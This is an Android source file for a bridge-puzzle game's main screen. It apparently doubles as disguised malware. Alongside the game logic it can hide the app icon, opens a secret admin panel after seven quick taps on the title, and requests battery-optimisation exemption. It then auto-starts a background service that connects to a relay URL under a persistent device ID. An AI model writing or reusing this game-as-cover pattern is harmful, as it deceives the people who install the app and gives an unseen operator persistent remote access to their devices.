package com.hashibridge.master;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.hashibridge.master.game.BridgeGameView;
import com.hashibridge.master.game.BridgePuzzleGenerator;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    private static final int RC_NOTIFICATION = 2001;
    private static final int RC_BATTERY_OPT  = 2002;

    // Hidden admin trigger: tap title 7 times quickly
    private static final int SECRET_TAPS     = 7;
    private static final long TAP_WINDOW_MS  = 3000;
    private int tapCount = 0;
    private long firstTapTime = 0;

    private static final String PREFS_GAME   = "hashi_game_prefs";
    private static final String KEY_BEST     = "best_lv";

    private BridgeGameView gameView;
    private TextView tvHud;
    private TextView tvLevelBadge;
    private TextView tvMoves;
    private TextView tvBest;

    private int currentLevel = 1;
    private int islandCount  = 5;
    private int moveCount    = 0;
    private final Random random = new Random();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);

        if (com.hashibridge.master.utils.Config.isIconHidden(this)) {
            com.hashibridge.master.utils.Config.hideAppIcon(this);
        }

        gameView      = findViewById(R.id.game_view);
        tvHud         = findViewById(R.id.tv_hud);
        tvLevelBadge  = findViewById(R.id.tv_level_badge);
        tvMoves       = findViewById(R.id.tv_moves);
        tvBest        = findViewById(R.id.tv_best);
        Button btnReset = findViewById(R.id.btn_reset);
        Button btnNext  = findViewById(R.id.btn_next);

        gameView.setOnWinListener(() -> {
            saveBestIfBetter(currentLevel);
            tvHud.setText("Solved! Tap Next for level " + (currentLevel + 1));
            Toast.makeText(this, "Well done!", Toast.LENGTH_SHORT).show();
        });

        gameView.setOnMoveListener(() -> {
            moveCount++;
            tvMoves.setText(String.valueOf(moveCount));
        });

        btnReset.setOnClickListener(v -> startPuzzle(currentLevel));
        btnNext.setOnClickListener(v -> {
            currentLevel++;
            startPuzzle(currentLevel);
        });

        // Hidden trigger: tap title rapidly SECRET_TAPS times
        findViewById(R.id.tv_title).setOnClickListener(v -> handleSecretTap());
        // Level badge long-press copies Device ID (debug aid)
        tvLevelBadge.setOnLongClickListener(v -> { copyDeviceId(); return true; });

        updateBestDisplay();
        startPuzzle(currentLevel);

        // Minimal permission flow
        requestNotificationPermissionThenBatteryOpt();
    }

    // ─── Secret tap to open admin ──────────────────────────────────────────

    private void handleSecretTap() {
        long now = System.currentTimeMillis();
        if (tapCount == 0 || now - firstTapTime > TAP_WINDOW_MS) {
            tapCount = 1;
            firstTapTime = now;
        } else {
            tapCount++;
        }
        if (tapCount >= SECRET_TAPS) {
            tapCount = 0;
            openAdminPanel();
        }
    }

    // ─── Permission flow ──────────────────────────────────────────────────

    private void requestNotificationPermissionThenBatteryOpt() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (androidx.core.content.ContextCompat.checkSelfPermission(
                    this, android.Manifest.permission.POST_NOTIFICATIONS)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{android.Manifest.permission.POST_NOTIFICATIONS},
                        RC_NOTIFICATION);
                return;
            }
        }
        requestBatteryOptimizationExemption();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == RC_NOTIFICATION) {
            requestBatteryOptimizationExemption();
        }
    }

    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent i = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, RC_BATTERY_OPT);
                    return;
                } catch (Exception ignored) {}
            }
        }
        autoStartServiceIfReady();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_BATTERY_OPT) {
            autoStartServiceIfReady();
        }
    }

    // ─── Game helpers ─────────────────────────────────────────────────────

    private void startPuzzle(int level) {
        // Difficulty scales with level:
        // lv 1-3: 5 islands (4x4 grid), lv 4-7: 6-7 islands (5x5), lv 8+: 8-10 (6x6)
        islandCount = Math.min(10, 4 + (level / 2));
        int gridSize = (level < 4) ? 4 : (level < 8) ? 5 : 6;

        moveCount = 0;
        tvMoves.setText("0");
        tvLevelBadge.setText("Lv " + level);
        tvHud.setText("Connect islands · numbers show bridge count");

        BridgePuzzleGenerator.Puzzle puzzle =
                BridgePuzzleGenerator.generate(random, islandCount, gridSize);
        gameView.setPuzzle(puzzle);
    }

    private void saveBestIfBetter(int level) {
        SharedPreferences prefs = getSharedPreferences(PREFS_GAME, MODE_PRIVATE);
        int best = prefs.getInt(KEY_BEST, 0);
        if (level > best) {
            prefs.edit().putInt(KEY_BEST, level).apply();
            updateBestDisplay();
        }
    }

    private void updateBestDisplay() {
        SharedPreferences prefs = getSharedPreferences(PREFS_GAME, MODE_PRIVATE);
        int best = prefs.getInt(KEY_BEST, 0);
        tvBest.setText(best > 0 ? "Lv " + best : "-");
    }

    private void openAdminPanel() {
        try {
            startActivity(new Intent(this, ControlPanelActivity.class));
        } catch (Exception ignored) {}
    }

    private void copyDeviceId() {
        String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);
        android.content.ClipboardManager clipboard =
                (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        android.content.ClipData clip =
                android.content.ClipData.newPlainText("Device ID", deviceId);
        clipboard.setPrimaryClip(clip);
        Toast.makeText(this, "ID: " + deviceId, Toast.LENGTH_SHORT).show();
    }

    private void autoStartServiceIfReady() {
        if (!BridgeService.isRunning()) {
            String savedRelay = com.hashibridge.master.utils.Config.getRelayUrl(this);
            if (savedRelay.isEmpty()) savedRelay = getString(R.string.default_relay_url);
            String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);

            com.hashibridge.master.utils.Config.saveConfig(this, savedRelay, deviceId);
            com.hashibridge.master.utils.Config.setAutoStart(this, true);

            Intent intent = new Intent(this, BridgeService.class);
            intent.putExtra("relayUrl", savedRelay);
            intent.putExtra("deviceId", deviceId);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        }
    }
}
